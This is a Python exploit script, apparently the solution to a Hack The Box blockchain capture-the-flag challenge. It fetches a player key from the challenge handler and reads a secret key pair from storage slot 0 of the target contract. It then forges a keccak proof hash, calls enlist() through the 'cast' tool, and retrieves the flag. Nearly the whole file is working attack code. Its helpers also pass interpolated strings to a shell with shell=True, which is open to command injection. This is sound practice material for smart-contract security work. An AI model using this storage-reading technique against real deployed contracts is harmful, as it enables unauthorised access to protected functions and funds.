#!/usr/bin/env python3

import subprocess
from web3 import Web3
from eth_account import Account
from pwn import remote, context, args

context.log_level = "DEBUG"

if args.REMOTE:
    IP = args.HOST
    RPC_PORT = int(args.RPC_PORT)
    TCP_PORT = int(args.HANDLER_PORT)
    RPC_URL = f"http://{IP}:{RPC_PORT}/"
    HANDLER_URL = (IP, TCP_PORT)
else:
    RPC_URL = "http://localhost:8888/"
    HANDLER_URL = ("localhost", 8000)

def csend(contract: str, fn: str, *args, **options):
    base_command = f"cast send {contract} '{fn}' {' '.join(args)}"
    options_str = ' '.join([f"--{key.replace('_', '-')}" + (f" {value}" if value else "") for key, value in options.items()])
    command = f"{base_command} {options_str} --rpc-url {RPC_URL} --private-key {player_pvk}"
    print(f"[*] {command}")
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
    if result.returncode == 0:
        print(f"[+] Output:\n{result.stdout}")
    else:
        print(f"[!] Error:\n{result.stderr}")
        exit(1)
    return result.stdout

def ccall(contract: str, fn: str, *args, **options):
    base_command = f"cast call {contract} '{fn}' {' '.join(args)}"
    options_str = ' '.join([f"--{key.replace('_', '-')}" + (f" {value}" if value else "") for key, value in options.items()])
    command = f"{base_command} {options_str} --rpc-url {RPC_URL} --private-key {player_pvk}"
    print(f"[*] {command}")
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
    if result.returncode == 0:
        print(f"[+] Output:\n{result.stdout}")
    else:
        print(f"[!] Error:\n{result.stderr}")
        exit(1)
    return result.stdout


if __name__ == "__main__":
    connection_info = {}
    handler_host, handler_port = HANDLER_URL
    
    ### connect to challenge handler and get connection info ##
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"1")
        data = p.recvall()

    lines = data.decode().split('\n')
    for line in lines:
        if line.startswith("[*]"):
            continue
        if line:
            key, value = line.split(': ')
            key = key.strip()
            value = value.strip()
            connection_info[key] = value

    player_pvk = connection_info['Player Private Key']
    setup_addr = connection_info['Setup contract']
    target_addr = connection_info['Target contract']
    player_account = Account.from_key(player_pvk)
    print(f"[+] Player Address: {player_account.address}")
    print(f"[+] Setup Contract Address: {setup_addr}")
    print(f"[+] Target Contract Address: {target_addr}")
    
    ### exploitation ###
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    assert w3.is_connected(), "Failed to connect to RPC"
    print(f"[*] Connected to RPC {RPC_URL}")

    key = w3.eth.get_storage_at(target_addr, 0)
    private_key, public_key = (key[:16], key[16:32])
    print(f"[*] publicKey: {public_key.hex()}")
    print(f"[*] privateKey: {private_key.hex()}")

    proof_hash = w3.keccak(public_key + private_key)
    print(f"[*] proofHash: {proof_hash.hex()}")

    csend(target_addr, "enlist(bytes32)", proof_hash.hex())
    print(f"[*] Enlisted {player_account.address} to the target contract")

    ### get flag ###
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"3")
        flag = p.recvall().decode()
    if "HTB" in flag:
        print(f"\n\n[*] {flag}")
    